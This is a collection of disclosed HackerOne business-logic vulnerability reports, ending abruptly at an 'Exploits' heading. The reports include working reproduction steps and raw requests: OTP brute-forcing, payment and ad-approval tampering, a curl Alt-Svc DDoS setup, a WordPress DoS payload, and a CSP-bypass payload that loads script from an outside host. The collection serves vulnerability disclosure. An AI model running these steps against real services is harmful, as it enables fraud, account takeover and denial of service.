# Business Logic Errors

_64 reports — High/Critical, disclosed_

### [Non-premium user can disable Ads in japanese version of dic.pixiv.net](https://hackerone.com/reports/3183520)

- **Report ID:** `3183520`
- **Severity:** High
- **Weakness:** Business Logic Errors
- **Program:** pixiv
- **Reporter:** @lainkusanagi
- **Bounty:** 3000 usd
- **Disclosed:** 2026-04-27T03:58:30.124Z
- **CVE(s):** -

**Summary (team):**

## Summary

A vulnerability is identified in the Japanese version of the pixiv dictionary website (`dic.pixiv.net`) where non-premium users can disable advertisements. Normally, the ability to disable ads is restricted to premium users only, as indicated by the "P" icon next to the ad display settings in the user profile. However, due to improper access control at the API endpoint `/_api/update_user_setting`, any authenticated user can modify their ad display preferences without verification of premium status.

## Steps to Reproduce

1. Disable any ad-blocker plugins in your browser and login as a non-premium Pixiv user
2. Browse to `https://dic.pixiv.net` (the Japanese version that doesn't have /en in the URL) and observe ads being displayed normally
3. Intercept any request to `dic.pixiv.net` that includes your cookies
4. Modify the request by:
   - Changing the HTTP method to POST
   - Setting the target URL to `/_api/update_user_setting`
   - Including the following JSON data in the request body: `{"setting":{"showAds":false,"showNewUI":true}}`
   - Note: No need to worry about the Content-Type header, as the server does not validate it
5. Send the request - the response should be `{"success":true}`
{F4536685}
6. Go to your profile at `https://dic.pixiv.net/mypage` and verify that "表示しない" (Do not display ads) is now selected despite not being a premium user
{F4536687}
7. Browse the site to confirm that ads are no longer displayed

## Impact

The vulnerability allows non-premium users to access a feature that should be restricted to paying customers only. This can result in:

1. Lost revenue from reduced ad impressions when non-premium users disable advertisements
2. Devaluation of the premium subscription offering, as one of its key benefits (ad-free browsing) can be obtained for free
3. Potential widespread exploitation if knowledge of this vulnerability spreads among users

---

### [PROTOCOL-LEVEL: Persistent UDP Amplification and Cache Poisoning via Alt-Svc Logic Flaw](https://hackerone.com/reports/3483902)

- **Report ID:** `3483902`
- **Severity:** High
- **Weakness:** Business Logic Errors
- **Program:** curl
- **Reporter:** @huntsd
- **Bounty:** - usd
- **Disclosed:** 2026-01-02T21:35:02.283Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary
A structural logic flaw in the `libcurl` `Alt-Svc` header parser allows attack attributes (specifically `persist` and `max-age`) to "leak" from one service definition to another.

We have successfully chained this logic bug with `curl`'s HTTP/3 (QUIC) support to demonstrate a **Persistent UDP Amplification** attack. An attacker can force a victim's client to cache a malicious UDP route for up to 30 days (`persist=1`), turning the client into an unwilling participant in a distributed denial-of-service (DDoS) attack against arbitrary targets.

## Affected version
Reproduced on: **curl 8.17.0** (and `libcurl` master branch)
Platform: **Linux/Generic** (Issue is cross-platform)

## Steps To Reproduce
1.  **Setup Malicious Server**: Host an HTTP/HTTPS server that returns the following header:
    `Alt-Svc: h3="<VICTIM_IP>:12345", h2=":443"; ma=2592000; persist=1`
2.  **Trigger (Client Side)**: Run `curl --alt-svc cache.txt https://<ATTACKER_HOST>`
    -   *Logic Flaw*: `curl` correctly parses `persist=1` for `h2`, but **incorrectly applies it** to `h3` as well due to scope leakage in `lib/altsvc.c`.
3.  **Verify Persistence**:
    -   Inspect `cache.txt`. You will see the `h3` entry for `<VICTIM_IP>` has the persistence flag set and a 30-day expiry.
4.  **Verify Attack**:
    -   Kill the server/client.
    -   Run `curl https://<ATTACKER_HOST>` again (simulating a future visit).
    -   `curl` will immediately send a **1200-byte UDP QUIC Initial packet** to `<VICTIM_IP>:12345`.

## Supporting Material
-   This utilizes a "Confused Deputy" amplification vector (Factor ~30x).
-   Privacy Impact: The persistence flag allows "Server-Side Super Cookies" that track users across network changes.

## Impact

## Summary
This vulnerability transforms `libcurl` clients into a **Persistent Botnet** for UDP Amplification attacks.

1.  **DDoS Amplification**: By injecting a malicious QUIC route, an attacker can designate *any* IP address as a target. Every victim who visits the attacker's site once becomes a permanent amplifier, sending heavy UDP traffic to the target on every subsequent visit.
2.  **Privacy Violation**: The logic bug allows attackers to force `persist=1` on routes that should be ephemeral, enabling long-term user tracking that persists across network changes (bypassing standard anonymity protections).

---

### [Change phone number OTP flaw leads to any phone number takeover](https://hackerone.com/reports/2588329)

- **Report ID:** `2588329`
- **Severity:** Critical
- **Weakness:** Business Logic Errors
- **Program:** inDrive
- **Reporter:** @polem4rch
- **Bounty:** 2000 usd
- **Disclosed:** 2024-10-09T04:21:45.002Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:

Dear Indrive,

Ive found another valid report, the app allows any user to change the app phone number, but a flaw within the otp allows any number to be added into the account!

When an user requests a phone number change inside the app, it will send a 4 digit code but if you place 0000, it will accept any number and update it into the app!!

## Steps To Reproduce:

  1. Click setting in the account
  2. Click into the phone number and change for a new one
  3. Input 0000 as the otp code

  Phone number added!!


VIDEO POC

████████

At the end you can see  i was trying to pick a number from my contacts but instead i  just use a random phone number and works!!



Remediation: Make sure the otp doesnt accept 0000 or other invalid codes

Let me know if anything,

Regards,

Polem4rch

## Impact

Any attacker can use the phone number for an account takeover or delete anyone account, or cancelling trips

**Summary (team):**

Subscribe to our telegram channel with updates https://t.me/indrive_bbp

---

### [Business Logic error leads to bypass 2FA requirement ](https://hackerone.com/reports/2571981)

- **Report ID:** `2571981`
- **Severity:** High
- **Weakness:** Business Logic Errors
- **Program:** HackerOne
- **Reporter:** @abdulprkr
- **Bounty:** - usd
- **Disclosed:** 2024-07-11T14:32:59.708Z
- **CVE(s):** -

**Vulnerability Information:**

Hi team,

##Summary
I have identified a business logic issue in the 2FA requirement. I noticed that the organization enables the 2FA requirement so that only reporters who have set up 2FA can report, due to security reasons. This is because the report contains sensitive information, and if a hacker's credentials are compromised, the 2FA protection should be in place. This ensures that the vulnerability reported by the hacker remains secure. However, if the hacker adds another hacker as a collaborator, the hackerone does not check whether the invited hacker has set up 2FA or not. The invited hacker can join the report without any 2FA requirement, which contains the same sensitive information that the organization has mandated 2FA to protect. Therefore, it is necessary to ensure that the invited hacker also has 2FA set up. Otherwise, they should not be able to accept the invitation until they set up 2FA. This would ensure that only those hackers who have set up 2FA can access the organization's report.

##Step to Reproduce:
Step 1: Create 2 account one with 2FA enable (A) & another without 2FA (B)
Step 2: Select Program which required 2FA & allow collabration 
Step 3: Create Report Using account (A) & add account (B) ass collaborator
Step 4: Submit Report 
Step 5: Observe that invitation sent Successfully
Step 6: Now accept Invitation & observe that now you can access the report without 2FA requirement

## Impact

>Sensitive Information Exposure: The primary objective of implementing 2FA is to secure sensitive information in reports. If a hacker without 2FA is invited as a collaborator, they can access this sensitive information without the additional security layer. This defeats the purpose of having 2FA, leaving sensitive data vulnerable to unauthorized access.

>Increased Risk of Data Breaches: If a hacker's credentials are compromised, the 2FA protection is supposed to mitigate this risk. Allowing a collaborator without 2FA exposes the organization to potential data breaches, as the compromised credentials can be used to gain access to reports containing critical vulnerabilities.

---

### [Attackers can *Upgrade and claim offer* on the Premium Trial Subscription with a total price of *IDR0.00* from the original *IDR7,022,061.82*](https://hackerone.com/reports/2131224)

- **Report ID:** `2131224`
- **Severity:** High
- **Weakness:** Business Logic Errors
- **Program:** LinkedIn
- **Reporter:** @find_me_here
- **Bounty:** - usd
- **Disclosed:** 2024-06-18T21:44:59.392Z
- **CVE(s):** -

**Summary (team):**

Reporter found a method to tamper with the premium pricing flow where an attacker could subscribe to LinkedIn Sales Navigator Core offering for free. This issue has been fixed and is now resolved.

**Summary (researcher):**

##WriteUp:
https://aidilarf.medium.com/part-2-anyone-can-use-unlimited-trial-premium-on-accounts-that-have-used-trial-premium-before-b1ac65c9a2d6

---

### [Any user could upload attachments to pentest scoping form they don't have access to](https://hackerone.com/reports/2450215)

- **Report ID:** `2450215`
- **Severity:** High
- **Weakness:** Business Logic Errors
- **Program:** HackerOne
- **Reporter:** @hillybott
- **Bounty:** - usd
- **Disclosed:** 2024-05-15T16:36:35.956Z
- **CVE(s):** -

**Vulnerability Information:**

hello team
in my recent testing i found that any users could upload attachments to any users pentest scoping form without having access to it as long as they have the scope id.
note: before you start you will require two account to test for this bug.
steps to reproduce:
1. create a sandbox
2. go to pentest an start an pentest form
3.copy the pentest form id from the url
4. log in to your second account
5. send the following request
==================================================================================================================
POST /attachments HTTP/2
Host: hackerone.com
Cookie: your cookies
-----------------------------22121373215470710503552942440
Content-Disposition: form-data; name="tracer"

989953fa-5635-43c9-b584-48736d224b15
-----------------------------22121373215470710503552942440
Content-Disposition: form-data; name="context_type"

PentestOpportunity
-----------------------------22121373215470710503552942440
Content-Disposition: form-data; name="file"; filename="does not have a option to change his own permission.png"
Content-Type: image/png

====================================================================================================================
6.from your previous account reload the scoping form and go to review and submit .
7. you will notice that the file have been successfully uploaded.

## Impact

business logic error
could attach malicious files to anyones scoping form.

**Summary (team):**

The root cause of this issue appears to be insufficient access controls implemented in the attachment upload functionality for pentest scoping forms. The endpoint responsible for handling attachment uploads did not properly validate the user's access rights to the specific scoping form, allowing any authenticated user to upload files as long as they had the scoping form ID.

According to the engineering team, the scoping form can be "accessed" by any signed in account, but they should not be able to access data/send mutations without authorization (the attachment controller logic is separate from the pentest opportunity's mutations). So a non-authorized signed in user would just see an empty scoping form that they cannot autosave/submit. 

As a result of this, a fix has been implemented to prevent attachment uploads for non-org members of the scoping form.

---

### [CSP Bypass and escalation of https://hackerone.com/reports/2279346](https://hackerone.com/reports/2387458)

- **Report ID:** `2387458`
- **Severity:** High
- **Weakness:** Business Logic Errors
- **Program:** PortSwigger Web Security
- **Reporter:** @priyanshusharma9789
- **Bounty:** - usd
- **Disclosed:** 2024-02-23T15:39:07.043Z
- **CVE(s):** -

**Vulnerability Information:**

Hello Team , 

I have gone through this report https://hackerone.com/reports/2279346 and their is CSP bypass where website has implemented security in that but after this i can escalate Again CSP bypass with using different Script .

As shown in https://hackerone.com/reports/2279346 report website rectify the scripts like: 

document.getElementsByTagName("div")[0].innerHTML=`<iframe srcdoc="<div lang=en ng-app=application ng-csp class=ng-scope>
<script src='https://www.google.com/recaptcha/about/js/main.min.js'></script>
<img src=x ng-on-error='w=$event.target.ownerDocument;a=w.defaultView.top.document.querySelector(&quot;[nonce]&quot;);b=w.createElement(&quot;script&quot;);b.src=&quot;//joaxcar.com/hack.js&quot;;b.nonce=a.nonce;w.body.appendChild(b)'>
</div>
">`


But their is new way where i can escalate the bug with new script which is : 

var demo=document.createElement("img");
demo.src="https://i.ytimg.com/vi/0vxCFIGCqnI/maxresdefault.jpg"; 
document.body.innerHTML="";demo.width="1000"; demo.height="1000";
document.body.appendChild(demo);

F3074920


Steps: 
Go to https://portswigger.net/
Inject the script in console tab and see the impact

In this website configuration on CSP header is not proper . In my attachment their is no header for img in CSP . So attacker can escalate the bug again with different scripts.
F3074919

Thanks 
Priyanshu

## Impact

Escalate the bug with new script

CSP bypass using img script.

---

### [the domain is truck-admin.eu-east-1.indriverapp.com and Enter the management system of the blasting mobile phone verification code](https://hackerone.com/reports/1991376)

- **Report ID:** `1991376`
- **Severity:** High
- **Weakness:** Business Logic Errors
- **Program:** inDrive
- **Reporter:** @trustworthy
- **Bounty:** - usd
- **Disclosed:** 2023-09-11T07:22:56.605Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
Find the mobile phone number of the administrator through the WHOIS information, and then send the verification code. Assuming that the verification code expires for 30 seconds or 1 minute, we can only explode the correct verification code in a short time to log in to the management system, so I choose to blast The verification code between 6000 and 7000, and sends the verification code every time it blasts, knows that the correct verification code is found, and I only exploded 8 times to find the correct verification code

## Steps To Reproduce:
  1. Find the management address through the directory scanning:https://truck-admin.eu-east-1.indriverapp.com/admin/auth
  2. Find the administrator's mobile phone number through WHOIS information:████████
  3. Send the verification code through the mobile phone number, you will receive a four -digit verification code
  4. Enter the four-digit verification code to log in and use Burpsuite to grab the package, blast the verification code and set the range of the verification code to 6000-7000, and the thread is set to 20 to ensure that the correct verification code can be blasting within 30 seconds within 30 seconds
██████████

request:
```
POST /proxy/truck/api/admin/login HTTP/2
Host: truck-admin.eu-east-1.indriverapp.com
Cookie: _gcl_au=1.1.354145541.1684380001; _ga=GA1.1.1412822094.1684380001; _ga_YBFM6LW448=GS1.1.1684382089.2.1.1684382341.58.0.0
Content-Length: 37
Sec-Ch-Ua: "Chromium";v="21", " Not;A Brand";v="99"
Accept: application/json, text/plain, */*
Content-Type: application/json
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Origin: https://truck-admin.eu-east-1.indriverapp.com
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://truck-admin.eu-east-1.indriverapp.com/admin/auth
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9

{"phone":"██████","code":"1234"}
 ```
Burp  Settings:
█████████████
  5. Repeat 3,4 steps until the correct verification code is exploded
██████
6. Add the cookie obtained in the fifth step to the request header and access https://truck-admin.eu-east-1.indriverapp.com/admin/order,and then enter the management system
██████████
█████████

## Supporting Material/References:

  * [attachment / reference]

████
████
███

## Impact

Can get detailed information from all drivers and customers of the entire platform, including the driver's model license plate number, and customer taxi order records, taxi records include license plates/taxi position/reaching location, etc.

**Summary (team):**

Subscribe to our telegram channel with updates https://t.me/indrive_bbp

---

### [User scoped external storage can be used to gather credentials of other users ](https://hackerone.com/reports/1978882)

- **Report ID:** `1978882`
- **Severity:** High
- **Weakness:** Business Logic Errors
- **Program:** Nextcloud
- **Reporter:** @bhmth
- **Bounty:** - usd
- **Disclosed:** 2023-06-27T15:55:11.275Z
- **CVE(s):** CVE-2023-35928

**Summary (team):**

Security advisory at https://github.com/nextcloud/security-advisories/security/advisories/GHSA-637g-xp2c-qh5h

---

### [Able to approve admin approval and change effective status without adding payment details . ](https://hackerone.com/reports/1543159)

- **Report ID:** `1543159`
- **Severity:** High
- **Weakness:** Business Logic Errors
- **Program:** Reddit
- **Reporter:** @bisesh
- **Bounty:** 5000 usd
- **Disclosed:** 2022-06-22T05:05:02.156Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:

In https://ads.reddit.com/ you can create campaign under which you can create ads , once you create new campaign , it is on pending stage and will not be delivered unless you add payment details and is reviewed by admin and approved according to what it says here https://advertising.reddithelp.com/en/categories/ad-review/about-reddits-ad-review-process . But changing the value of admin_approval to APPROVED and effective_status to ACTIVE , the ads is approved and thus we receive the confirmation email from reddit ads that our ads is approved .

## Impact:
Can bypass the review process and change the ads status to approve and active without payment process .

## Steps To Reproduce:
[add details for how we can reproduce the issue]

  1. Create a campaign from https://ads.reddit.com 
  1. Go to https://ads.reddit.com/dashboard, you will see a table list that shows your ads and campaign , there the status is stated as PENDING . And we know according to what reddit says , our ads needs to get reviewed by reddit members , but updating the value from api changes our status to ACTIVE . Hence ad is successfully delivered . 
POC video is attached . 

███████

```
PATCH /api/v2.0/accounts/█████/ads/██████████ HTTP/2
Host: ads-api.reddit.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:99.0) Gecko/20100101 Firefox/99.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://ads.reddit.com/
Authorization: bearer token
Content-Type: application/json
Origin: https://ads.reddit.com
Content-Length: 101
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
X-Pwnfox-Color: magenta
Te: trailers

{"data":
{"configured_status":"ACTIVE",
"effective_status":"ACTIVE",
"admin_approval":"APPROVED"
}}

```

## Supporting Material/References:


  * [attachment / reference]

## Impact

Can bypass the review process and change the ads status to approve and active without payment process .

---

### [[app.lemlist.com] Improper handling of payment lead to bypass payment](https://hackerone.com/reports/1420697)

- **Report ID:** `1420697`
- **Severity:** High
- **Weakness:** Business Logic Errors
- **Program:** lemlist
- **Reporter:** @omarelfarsaoui
- **Bounty:** - usd
- **Disclosed:** 2022-05-17T08:54:42.188Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
Hello Team,
I truly hope it treats you awesomely on your side of the screen :)

due to improper handling of payment methods, an attacker can easily bypass the payment and benefit from a paid plan.

## Steps To Reproduce:

1. Log to your account
1. Go to the billing page
1. Fill in the address tab
1. Go to the next tab `Payment Card` 
1. ==Now the interesting step Make sure you don't have any money on your credit card==
1.  Chose `Email outreach` and wait until you get a notification that the payment is failed
1.  Next  increase the number of seats for example 50 
1. Again you will get a notification that the payment is failed
1. Now Cancel the subscription
1. Now I can use the paid features without paying anything.

# POC
{{F1538593}}

## Impact

I think the impact is pretty obvious, an attacker can use paid plans without paying anything.

if you need more info feel free to ping me 

best Regards
@omarelfarsaoui

---

### [Ability to use premium templates as free user via https://stripo.email/templates/?utm_source=viewstripo&utm_medium=referral](https://hackerone.com/reports/1166993)

- **Report ID:** `1166993`
- **Severity:** High
- **Weakness:** Business Logic Errors
- **Program:** Stripo Inc
- **Reporter:** @20kilograma
- **Bounty:** - usd
- **Disclosed:** 2022-03-30T06:18:47.794Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
Hello, I found security vulnerability in your web application, another business logic.

## Steps To Reproduce
  1. Go to https://stripo.email/templates/?utm_source=viewstripo&utm_medium=referral
  2. Choose any premium template and click ```use in editor```
  3. Then sign in to save and it is in your templates

## Supporting Material/References:
Down there is video showing everything

  * [attachment / reference]

## Impact

Lose of business

---

### [Add upto 10K rupees to a wallet by paying an arbitrary amount](https://hackerone.com/reports/1408782)

- **Report ID:** `1408782`
- **Severity:** High
- **Weakness:** Business Logic Errors
- **Program:** Eternal
- **Reporter:** @ashoka_rao
- **Bounty:** 2000 usd
- **Disclosed:** 2022-02-23T12:19:17.891Z
- **CVE(s):** -

**Summary (team):**

| TimeStamp   |      Action      |
|----------|:-------------:|
| Wed, 24 Nov 2021, 11:24 IST | Received the report |
| Wed, 24 Nov 2021, 11:25 IST | Validation and analysis of issue initiated |
| Wed, 24 Nov 2021, 11:28 IST | Vulnerability reported to the respective Internal Team |
| Wed, 24 Nov 2021, 11:36 IST | The authenticity of the issue is verified by the Security Team |
| Wed, 24 Nov 2021, 11:41 IST | Report Triaged |
| Wed, 24 Nov 2021, 14:47 IST | Fix Deployed on Production |
| Wed, 24 Nov 2021, 14:48 IST | Severity adjusted to High (7.5 CVSS) by Security Team |
| Wed, 24 Nov 2021, 15:47 IST | Fix verified by the Security Team |
| Wed, 24 Nov 2021, 16:00 IST | Fix acknowledged by the respective Internal Team |
| Wed, 24 Nov 2021, 16:09 IST | Minimum Bounty awarded to the researcher |
| Wed, 24 Nov 2021, 16:28 IST | The researcher confirmed the fix |
| Wed, 24 Nov 2021, 23:15 IST | Full bounty + bonus awarded to the researcher |

## Summary:

Thanks to @ashoka_rao  for reporting the issue. The researcher demonstrated a way to add any amount (upto 10k) to Zomato wallet without paying the amount in full and by paying an arbitrary amount.

Other Payment methods and consumers including online ordering were not vulnerable to this.


## POC:
The addition to the Zomato wallet happens in a two-step process.

1. Generate the Order Request for Addition:
```bash
POST /gw/payments/zomato_money/order

{"country_id":"1","service_type":"ZM_RECHARGE","cart":"null","amount":"1000.0"}
```
Response:
```bash
{"order_id": "XXXX"}
```
2. Complete the Payment against the order request:
```bash
POST /v2/sdk/make_payment

amount=XX&order_id=XXX&order_type=ZM_RECHARGE
```

The amount requested to generate the `order_id - XXXX` was `1000` but while paying one could have passed an arbitrary amount instead of `1000` against the `order_id`, which was not cross-checked.

So one could have generated an order for the amount of `1000` while paying an arbitrary amount against the order and still get the entire amount defined in order added to your wallet (limited to 10K INR).

---

### [Unauthorized access to PII leads to MASS account Takeover](https://hackerone.com/reports/1061736)

- **Report ID:** `1061736`
- **Severity:** Critical
- **Weakness:** Business Logic Errors
- **Program:** U.S. Dept Of Defense
- **Reporter:** @takester
- **Bounty:** - usd
- **Disclosed:** 2022-02-14T21:15:46.985Z
- **CVE(s):** -

**Vulnerability Information:**

Hi, I hope you doing well
I found a critical endpoint which disclosed the personal information which can use to takeover any account present on https://██████████
#Steps:
1. Visit the link https://www.████████/███████    you will get my details,  including first name and last name, mobile number and email_address related to the account.
2. Go to the forgot password link present at https://www.███████/ click on it.
3. Enter the mail address later you will be taken to another page which will ask you to enter mail address and pin
4. After entering mail address enter the pin as "████" as █████████ is at the endpoint.
5. It will validate and will ask you to change the password of that account.

###Note:  To get email list and pin list just decrease the number at the endpoint 
for example https://www.████████/███will give you another mail_address and pin will be ██████████

## Impact

An attacker can able to takeover any account that is present on that side.

---

### [Multiple vulnerability leading to account takeover in TikTok SMB subdomain.](https://hackerone.com/reports/1404612)

- **Report ID:** `1404612`
- **Severity:** Critical
- **Weakness:** Business Logic Errors
- **Program:** TikTok
- **Reporter:** @lu3ky-13
- **Bounty:** - usd
- **Disclosed:** 2022-02-02T03:27:41.611Z
- **CVE(s):** -

**Summary (team):**

Multiple vulnerabilities like Insecure Direct Object Reference (IDOR), Cross-Site Request Forgery (CSRF), XSS were found that could have resulted in account takeover on the TikTok SMB subdomain. First, an Insecure Direct Object Reference (IDOR) was found, where a missing authorization check could allow an attacker to modify the details of another user. Second, a Cross-Site Request Forgery (CSRF) was found in which an attacker could takeover an account by sending a malicious link, which if clicked by another user could be used to modify that user's account's email address. We thank @lu3ky-13 for reporting this to our team and confirming its resolution.

**Summary (researcher):**

I have found Multiple account takeovers in the TikTok SMB subdomain 
=========================================================
first; just changed u_id=1000  to any u_id users and you can access the account and you can change email name logo users  0-click
second: it's CSRF TO XSS and to account takeover no have CSRF protect

I add this to Impact 

Impact
1 an attacker can take over an account with 0 clicks from IDOR
2 an attacker can add payload XSS in profile to any users
3 the profile not protected to CSRF TOKEN and an attacker can from csrf can change data profile like name and email or add payload XSS
4 both  vulnerability an attacker can use to account takeover

https://twitter.com/lu3ky13

---

### [Subdomain takeover of images.crossinstall.com](https://hackerone.com/reports/1406335)

- **Report ID:** `1406335`
- **Severity:** High
- **Weakness:** Business Logic Errors
- **Program:** X / xAI
- **Reporter:** @ian
- **Bounty:** - usd
- **Disclosed:** 2022-01-05T19:58:27.163Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary
images.crossinstall.com points to an AWS S3 bucket that no longer exists. I was able to take control of this bucket and put my own content onto it. I can now serve content on this domain, obtain a TLS certificate for this domain, etc.

If any customers or servers are pointing to anything within this domain, I could serve them arbitrary/malicious content. I could also use this in case your domain whitelists your own domain for OAuth, or if there are cookies scoped to the entire domain. Usually this can have a high impact.

## PoC
Visit images.crossinstall.com/index.html; an HTML comment with my username is present.

```
% dig images.crossinstall.com +short
assets.crossinstall.com.s3.amazonaws.com.
s3-1-w.amazonaws.com.
s3-w.us-east-1.amazonaws.com.
52.217.103.180

% curl images.crossinstall.com/index.html
<!-- hackerone/ian bugcrowd/iangcarroll -->

% whois crossinstall.com | grep Org
Registrant Organization: Twitter, Inc.
Admin Organization: Twitter, Inc.
Tech Organization: Twitter, Inc.
```

## Impact

Subdomain takeover

---

### [s3 bucket takeover presented in https://github.com/reddit/rpan-studio/blob/e1782332c75ecb2f774343258ff509788feab7ce/CI/full-build-macos.sh](https://hackerone.com/reports/1285598)

- **Report ID:** `1285598`
- **Severity:** High
- **Weakness:** Business Logic Errors
- **Program:** Reddit
- **Reporter:** @gaurav-bhatia
- **Bounty:** - usd
- **Disclosed:** 2021-10-21T19:48:20.227Z
- **CVE(s):** -

**Vulnerability Information:**

Hey team,

## Summary:
 I have found that in the code of full-build-macos.sh in rpanstudio on github(https://github.com/reddit/rpan-studio/blob/e1782332c75ecb2f774343258ff509788feab7ce/CI/install-dependencies-osx.sh) contains a  s3 bucket which was unclaimed i.e (https://obs-nightly.s3-us-west-2.amazonaws.com)

## Steps To Reproduce:
1. Create a s3 bucket with name obs-nightly and us west 2 region
2. Upload files  with the name same as given in the code  (e.g. cef_binary_${1}_macosx64.tar.bz2)
3. Make the settings and change it as a static website 
4. You have successfully taken the s3 bucket and now when any user runs the code the url with s3 get executed and an attacker can spread dangerous malware.

## POC:

1. Link for the s3 bucket takenover :- https://obs-nightly.s3-us-west-2.amazonaws.com/index.html
{F1395337}

2. Github link that shows the s3 bucket :- https://github.com/reddit/rpan-studio/blob/e1782332c75ecb2f774343258ff509788feab7ce/CI/install-dependencies-osx.sh
{F1395340}
3. Github link that shows the s3 bucket :- https://github.com/reddit/rpan-studio/blob/e1782332c75ecb2f774343258ff509788feab7ce/CI/full-build-macos.sh
{F1395338}

##Remediaton
You should remove the unclaimed s3 bucket as soon as possible from both the codes as it possess a critical risk

## Impact

An attacker can takeover the s3 bucket and can host his malicious content with the name (cef_binary_${1}_macosx64.tar.bz2) as presented in the code and can spread ransomware and many malicious files. This bug has a critical impact because the code of the tool that many people uses, contains unclaimed s3 bucket.

Regards,
Gaurav Bhatia

---

### [[mtn.com.af] Multiple vulnerabilities allow to Application level DoS](https://hackerone.com/reports/946578)

- **Report ID:** `946578`
- **Severity:** High
- **Weakness:** Business Logic Errors
- **Program:** MTN Group
- **Reporter:** @lmhu
- **Bounty:** - usd
- **Disclosed:** 2021-09-28T04:52:05.197Z
- **CVE(s):** CVE-2018-6389

**Vulnerability Information:**

**Issue Description**
Unauthenticated attackers can cause a denial of service (resource consumption) by using the large list of registered .js files (from wp-includes/script-loader.php) to construct a series of requests to load every file many times.
The vulnerability is registered as [CVE-2018-6389] #761722 #752010 #753491 #335177

**CVE ID Risk Score**
[CVE-2018-6389 7.5](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-6389)

Platform(s) Affected: [website]
*.https://www.mtn.com.af/wp-admin/load-scripts.php?load=

###Steps To Reproduce:
  * Open Vulnerability url - open directory ``/wp-admin/load-scripts.php?load=``
  * Add ``parameter-vulnerable`` in request header
  * In request header using GET-Method
  * Show url opened , and check in network websites has been vulnerable stack-red
  * Response has been truncated

**Payloads Vulnerabilities**
```
eutil,common,wp-a11y,sack,quicktag,colorpicker,editor,wp-fullscreen-stu,wp-ajax-response,wp-api-request,wp-pointer,autosave,heartbeat,wp-auth-check,wp-lists,prototype,scriptaculous-root,scriptaculous-builder,scriptaculous-dragdrop,scriptaculous-effects,scriptaculous-slider,scriptaculous-sound,scriptaculous-controls,scriptaculous,cropper,jquery,jquery-core,jquery-migrate,jquery-ui-core,jquery-effects-core,jquery-effects-blind,jquery-effects-bounce,jquery-effects-clip,jquery-effects-drop,jquery-effects-explode,jquery-effects-fade,jquery-effects-fold,jquery-effects-highlight,jquery-effects-puff,jquery-effects-pulsate,jquery-effects-scale,jquery-effects-shake,jquery-effects-size,jquery-effects-slide,jquery-effects-transfer,jquery-ui-accordion,jquery-ui-autocomplete,jquery-ui-button,jquery-ui-datepicker,jquery-ui-dialog,jquery-ui-draggable,jquery-ui-droppable,jquery-ui-menu,jquery-ui-mouse,jquery-ui-position,jquery-ui-progressbar,jquery-ui-resizable,jquery-ui-selectable,jquery-ui-selectmenu,jquery-ui-slider,jquery-ui-sortable,jquery-ui-spinner,jquery-ui-tabs,jquery-ui-tooltip,jquery-ui-widget,jquery-form,jquery-color,schedule,jquery-query,jquery-serialize-object,jquery-hotkeys,jquery-table-hotkeys,jquery-touch-punch,suggest,imagesloaded,masonry,jquery-masonry,thickbox,jcrop,swfobject,moxiejs,plupload,plupload-handlers,wp-plupload,swfupload,swfupload-all,swfupload-handlers,comment-repl,json2,underscore,backbone,wp-util,wp-sanitize,wp-backbone,revisions,imgareaselect,mediaelement,mediaelement-core,mediaelement-migrat,mediaelement-vimeo,wp-mediaelement,wp-codemirror,csslint,jshint,esprima,jsonlint,htmlhint,htmlhint-kses,code-editor,wp-theme-plugin-editor,wp-playlist,zxcvbn-async,password-strength-meter,user-profile,language-chooser,user-suggest,admin-ba,wplink,wpdialogs,word-coun,media-upload,hoverIntent,customize-base,customize-loader,customize-preview,customize-models,customize-views,customize-controls,customize-selective-refresh,customize-widgets,customize-preview-widgets,customize-nav-menus,customize-preview-nav-menus,wp-custom-header,accordion,shortcode,media-models,wp-embe,media-views,media-editor,media-audiovideo,mce-view,wp-api,admin-tags,admin-comments,xfn,postbox,tags-box,tags-suggest,post,editor-expand,link,comment,admin-gallery,admin-widgets,media-widgets,media-audio-widget,media-image-widget,media-gallery-widget,media-video-widget,text-widgets,custom-html-widgets,theme,inline-edit-post,inline-edit-tax,plugin-install,updates,farbtastic,iris,wp-color-picker,dashboard,list-revision,media-grid,media,image-edit,set-post-thumbnail,nav-menu,custom-header,custom-background,media-gallery,svg-painter
```
**How to fix:**
```javascript
RewriteCond %{QUERY_STRING} ^.{1000,}$
RewriteRule ^WP-ADMIN/LOAD-SCRIPTS.PHP$ - f
```
add this to your .htaccess

## Impact

CVE-2018-6389

---

### [Unix time unlock_time values have dangerous validation rules enabling a number of exploits](https://hackerone.com/reports/854726)

- **Report ID:** `854726`
- **Severity:** High
- **Weakness:** Business Logic Errors
- **Program:** Monero
- **Reporter:** @thecharlatan
- **Bounty:** - usd
- **Disclosed:** 2021-09-12T08:36:52.215Z
- **CVE(s):** -

**Vulnerability Information:**

*Initially found by TheCharlatan, discussed with and expanded on by Isthmus, impacts all releases of monero and monero wallets*

## Description

The unlock_time field in monero transaction dictates when a transaction's outputs can be spent again. This rule is enforced by the consensus code in https://github.com/monero-project/monero/blob/master/src/cryptonote_core/blockchain.cpp#L3478 . The rule has two parts. If the unlock_time is below 500000000, it is interpreted as a block height and compared with the current block height. If the unlock_time in a used transaction input's previous output is below the current block height, a transaction using that output is valid. Otherwise it is invalid and not relayed.

If the unlock time is above 500000000, then it is interpreted as unix time in seconds. However, the unlock_time is not compared to the network or rather block time, but to the local time of the machine running the monero node. Using this local time is potentially problematic for the following reasons.

## Exploits

